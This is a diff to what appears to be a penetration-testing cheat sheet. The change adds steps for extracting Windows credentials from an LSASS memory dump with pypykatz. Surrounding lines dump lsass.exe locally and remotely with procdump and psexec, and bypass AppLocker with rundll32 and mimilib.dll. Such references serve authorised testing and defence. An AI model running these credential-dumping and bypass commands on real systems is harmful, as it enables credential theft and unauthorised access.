@@ -494,7 +494,12 @@ If you have path traversal plus a location with write access you can exploit tha
 - Create minidump: (easiest with right click in taskmgr)  
   `procdump64.exe -accepteula -ma lsass.exe lsass.dmp`  
    Remote: `psexec.py -c procdump64.exe 'example.com/username:P@ssw0rd@foobar.example.com' '-accepteula -ma lsass.exe c:\lsass.dmp'`  
-
+- On Kali, you can use pypykatz to extract the creds from the lsass.dmp:  
+  Install pypykatz:  
+  `# pip3 install pypykatz`  
+  Extract the creds from the lsass.dmp:   
+  `# pypykatz lsa minidump lsass.dmp`  
+    
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
